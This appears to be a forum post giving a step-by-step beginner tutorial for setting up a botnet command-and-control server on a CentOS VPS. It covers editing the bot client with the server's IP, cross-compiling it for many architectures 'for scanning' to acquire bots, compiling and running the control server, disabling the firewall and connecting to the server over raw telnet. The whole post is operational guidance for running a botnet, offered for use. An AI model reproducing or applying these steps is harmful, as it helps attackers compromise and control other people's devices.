I UNDERSTAND ITS A SHITTY TOPIC BUT I GET ASKED LIKE 3 TIMES A DAY HOW TO DO IT





Needed: 
1. PuTTy
2. WinSCP
2. VPS with CentOS 6.x installed. And another VPS for scanning in the future. (to get bots)
3. A fucking basic understanding of botnets

I tried to dummy this up for beginners.

Lets (w)get started

1. open your client.c with notepad++ and ctrl+f and replace all the ip's with your vps IP

2. Now go into PuTTy and connect to your vps, and login

3. yum update -y
4. yum install gcc -y
5. mkdir compile <--- these are just making directories, or 'folders'
6. mkdir tel <----

5. login to same vps with WinSCP

6. open the compile folder that you created in step 5 and put in cc7.py (cross-compiler) and your client.c

7. open tel folder from step 6 and put in your server.c

8. Go back to putty

9. cd compile <-- this brings you to your compile folder
10. python cc7.py client.c [your vps ip]
Get archs? YES
(takes a bit)

WHEN THE GREEN LINE POPS UP FOR STEP 10, COPY THAT SHIT YOU GONNA NEED IT FOR SCANNING

11. cd <<---- brings back to root of vps
12. cd tel <---- brings to tel folder
13. nano login.txt 

If you get an error for the nano command, type 'yum install nano' then try it.


Make login, all on one line; format; USER PASS
USER PASS
etc

14. ctrl x
15. crtl y
16. enter

17. gcc server.c -o server -pthread
18. screen ./server [bot port, from your client.c] 1000 [connect port, anything you want]
19. CTRL+A and then D while holding the ctrl to exit that screen
20. server iptables stop
21. service httpd restart
22. screen -rx

NOW;
open PuTTy and connect to the same VPS using same IP but with raw, 
and the connect port you created in step 18


Now ur a sp00ky sp00ky hacker lolz
